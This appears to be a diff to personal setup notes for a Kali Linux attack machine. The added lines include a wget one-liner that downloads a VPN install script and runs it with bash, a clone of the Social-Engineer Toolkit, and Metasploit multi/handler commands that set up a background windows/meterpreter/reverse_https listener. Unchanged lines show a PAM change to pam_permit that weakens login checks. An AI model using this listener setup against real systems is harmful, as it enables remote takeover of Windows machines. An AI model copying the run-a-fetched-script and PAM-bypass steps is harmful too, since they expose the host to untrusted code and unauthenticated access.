@@ -6,6 +6,12 @@ apt-get install kali-archive-keyring
 apt-get update
 apt-cache search kali-linux
 apt-get install kali-linux-top10 -y
+
+
+1 liner VPN INSTALL
+wget https://git.io/vpn -O openvpn-install.sh && bash openvpn-install.sh
+
+#.SET
 git clone https://github.com/trustedsec/social-engineer-toolkit.git
 
 
@@ -40,14 +46,26 @@ change this starting on line 11:
 ###auth required pam_succeed_if.so user != root quiet_success
 auth required pam_permit.so
 
-
-
-
-
-
-
-
 chkconfig ssh
 apt-get install chkconfig
 chkconfig -l ssh
 cd /etc/ssh/
+
+MSF PS .SET
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LPORT 443
+LHOST 0.0.0.0
+set ExitOnSession false
+exploit -j
+
+#MSF Community 
+#FIRST INSTALL
+sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev
+#THEN
+git clone https://github.com/rapid7/metasploit-framework.git
+gem install bundle
+bundle install
+
+
+
